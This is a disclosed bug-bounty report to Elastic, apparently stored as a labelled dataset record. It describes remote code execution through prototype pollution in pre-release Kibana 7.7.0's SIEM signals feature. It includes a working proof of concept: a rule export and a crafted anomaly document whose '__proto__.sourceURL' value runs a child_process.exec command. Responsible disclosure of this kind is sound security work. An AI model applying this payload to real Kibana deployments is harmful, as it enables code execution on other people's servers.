{
  "reported_to": "Elastic",
  "reported_by": "alexbrasetvik ",
  "title": "Remote Code Execution in coming Kibana 7.7.0",
  "content": "\nSummary:\nKibana 7.7.0 as per commit c5f682cb is vulnerable to a remote code execution vulnerability that is similar to the one reported in https://hackerone.com/reports/852613\nKibana 7.7.0 is not released, so this is an experiment. I know that getting these reports is more valuable to Elastic prior to a release, as the amount of work growing out of a critical vulnerability like this is a lot more after release. It could possibly be more valuable for me to wait until Cloud actually has the release and clearly is in scope, but I have faith in you wanting to encourage people to actually look at code whose release is imminent, so here's the report pre release.\nI saw that you have commited the fixes to my previous report: https://github.com/elastic/kibana/commit/68674568efac9070935f07e55dfd1a9f8482663d That fix is part of commit c5f682cb which the following is tested with.\nDescription:\nThere is a prototype pollution in the new \"SIEM signal\" feature: https://github.com/elastic/kibana/blob/master/x-pack/plugins/siem/server/lib/detection_engine/signals/bulk_create_ml_signals.ts#L58\nThe attached recording shows how to exercise this code via a SIEM detection rule. The following JSON-blob is an export of the detection rule used:\nCode 790 Bytes\n1{\"actions\":[],\"created_at\":\"2020-04-28T17:19:42.955Z\",\"updated_at\":\"2020-04-28T18:02:32.489Z\",\"created_by\":\"elastic\",\"description\":\"test\",\"enabled\":true,\"anomaly_threshold\":0,\"false_positives\":[],\"from\":\"now-108015s\",\"id\":\"ac26797b-9061-485c-889c-79993ca8e209\",\"immutable\":false,\"interval\":\"15s\",\"rule_id\":\"2a5a3f8e-79a9-4101-99d9-b414ed48c0db\",\"output_index\":\".siem-signals-default\",\"max_signals\":100,\"machine_learning_job_id\":\"linux_anomalous_network_activity_ecs\",\"risk_score\":50,\"name\":\"test\",\"references\":[],\"meta\":{\"from\":\"30h\",\"kibana_siem_app_url\":\"https://localhost:5601/app/siem\"},\"severity\":\"low\",\"updated_by\":\"elastic\",\"tags\":[],\"to\":\"now\",\"type\":\"machine_learning\",\"threat\":[],\"throttle\":\"no_actions\",\"version\":3}\n2{\"exported_count\":1,\"missing_rules\":[],\"missing_rules_count\":0}\nIf I create a fake ML-anomaly like follows, I can pollute the prototype:\nCode 536 Bytes\n1PUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh\n2{\n3  \"timestamp\": 1588093630045,\n4  \"result_type\": \"record\",\n5  \"record_score\": 1,\n6  \"job_id\": \"linux_anomalous_network_activity_ecs\",\n7  \"by_field_name\": \"field_name\",\n8  \"by_field_value\": \"field_value\",\n9  \"influencers\": [\n10    {\"influencer_field_name\": \"foo.__proto__.sourceURL\", \"influencer_field_values\": \"\\u2028\\u2029\\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')\"}\n11    ]\n12}\nNote that the timestamp might need adjusting, as the SIEM rule only looks 30h back in the past as provided.\nSteps To Reproduce:\nImport the provided SIEM detection rule.\nCreate the fake anomaly provided above.\nEnable the rule. Sometimes disabling and re-enabling it is necessary, which is probably a bug in itself.\nWait ~15 seconds for the rule to be evaluated, which should execute the code, which on a Mac will cause \"pwned\" to sound and the youtube clip to open.\nSupporting Material/References:\nVideo walkthrough attached.\nImpact\nA user with write access to these indexes (like any Cloud user would have) can achieve full remote code execution.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 5000,
  "weaknesses": [
    "Privilege Escalation"
  ],
  "screenshots": {},
  "disclosed_date": 1618883160,
  "report_url": "https://hackerone.com/reports/861744",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Import the provided SIEM detection rule."
    ],
    [
      2,
      "Create the fake anomaly provided in the report."
    ],
    [
      3,
      "Enable the rule (sometimes disabling and re-enabling is necessary)."
    ],
    [
      4,
      "Wait ~15 seconds for the rule to be evaluated, which should execute the code."
    ]
  ],
  "vuln_description": "Kibana 7.7.0 is vulnerable to a remote code execution vulnerability via prototype pollution in the 'SIEM signal' feature. By crafting a specific ML-anomaly with a polluted prototype, an attacker can execute arbitrary code on the system.",
  "reason": "The attack involves multiple components (SIEM detection rule, ML-anomaly creation, prototype pollution) and requires understanding of both the Kibana SIEM feature and JavaScript prototype pollution. The interaction between these components is non-obvious and requires precise timing and state manipulation.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "852613",
  "idor_detectable": false,
  "authnz_byppass_detectable": false,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "idor_detectable": false,
    "authnz_byppass_detectable": false
  }
}